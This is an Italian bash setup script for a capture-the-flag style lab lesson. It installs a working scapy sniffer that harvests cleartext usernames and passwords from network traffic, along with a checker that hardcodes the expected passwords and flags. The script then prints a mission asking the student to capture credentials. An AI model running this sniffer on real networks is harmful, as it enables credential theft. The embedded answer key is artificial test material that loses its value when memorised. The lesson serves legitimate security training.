#!/usr/bin/env bash
# Lezione 24 · lato Kali · sniffing di credenziali con scapy (tool).
# Installa il sniffer scapy e un verificatore. Idempotente.
set -uo pipefail

UTENTE="${SUDO_USER:-$USER}"
HOME_UTENTE="$(getent passwd "$UTENTE" | cut -d: -f6)"
[ -z "$HOME_UTENTE" ] && HOME_UTENTE="/home/$UTENTE"
DIR="$HOME_UTENTE/lab/lezione-24"

echo "== Lezione 24 · Sniffing di credenziali con scapy =="
mkdir -p "$DIR"

cat > "$DIR/sniffer.py" <<'PY'
#!/usr/bin/env python3
# sniffer.py - raccoglie credenziali in chiaro dalla rete con scapy.
# Uso:  sudo python3 sniffer.py [interfaccia]   (es. eth1)
# Cerca "utente=" e "password=" nel contenuto dei pacchetti e li elenca.
import sys, re
from scapy.all import sniff, Raw

iface = sys.argv[1] if len(sys.argv) > 1 else None
viste = set()
rx = re.compile(rb"utente=(\S+)\s+password=(\S+)")


def analizza(pkt):
    if not pkt.haslayer(Raw):
        return
    dati = bytes(pkt[Raw].load)
    m = rx.search(dati)
    if m:
        u = m.group(1).decode("utf-8", "replace")
        p = m.group(2).decode("utf-8", "replace")
        chiave = (u, p)
        if chiave not in viste:
            viste.add(chiave)
            print("[+] credenziali catturate ->  utente: %-12s password: %s" % (u, p))


print("[*] In ascolto... (Ctrl+C per fermare). Lascialo girare per catturare anche")
print("    le login rare. Interfaccia:", iface or "tutte")
sniff(iface=iface, filter="udp port 9998 or tcp", prn=analizza, store=0)
PY
chmod +x "$DIR/sniffer.py"
chown -R "$UTENTE:$UTENTE" "$HOME_UTENTE/lab" 2>/dev/null || true

cat > /usr/local/bin/lab24-verifica <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
low() { echo "${1:-}" | tr 'A-Z' 'a-z'; }
case "${1:-}" in
  comune)
    [ "$(low "${2:-}")" = "estate2022" ] && { echo "[OK] Credenziale frequente catturata!"; echo "FLAG{scapy_sniffa_credenziali}"; } \
      || echo "[--] No. E' la password dell'utente 'cassiere' (login frequente)." ;;
  rara)
    [ "$(low "${2:-}")" = "ammiragli0!2024" ] && { echo "[OK] Hai atteso la login rara: la pazienza paga!"; echo "FLAG{la_pazienza_paga}"; } \
      || echo "[--] No. Lascia girare il sniffer: la login 'admin' compare di rado." ;;
  *)
    echo "Uso: lab24-verifica {comune <password> | rara <password>}" ;;
esac
EOF
chmod 755 /usr/local/bin/lab24-verifica

python3 -c "import scapy" 2>/dev/null && echo "[OK] scapy presente." || echo "[--] scapy mancante (dovrebbe esserci dalla Lezione 2)."

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Raccogliere le password dalla rete, in automatico
------------------------------------------------------------
 Un attaccante non legge i pacchetti a mano: scrive un tool che estrae le
 credenziali da solo. Oggi lo fai con scapy.

 Cartella:  ~/lab/lezione-24   (sniffer.py)
 Trova l'interfaccia interna:  ip -br addr    (di solito eth1)

 [ ] 1  Cattura una credenziale frequente                      (+35)
        cd ~/lab/lezione-24
        cat sniffer.py
        sudo python3 sniffer.py eth1
        # appena vedi utente=cassiere, prendi la sua password:
        lab24-verifica comune <password>

 [ ] 2  Aspetta la login RARA (admin)                          (+35)
        # lascia girare il sniffer: la login admin compare di rado
        lab24-verifica rara <password>

 Concetti:  scapy  sniff()  filtro BPF  estrazione automatica  persistenza
------------------------------------------------------------
MSG
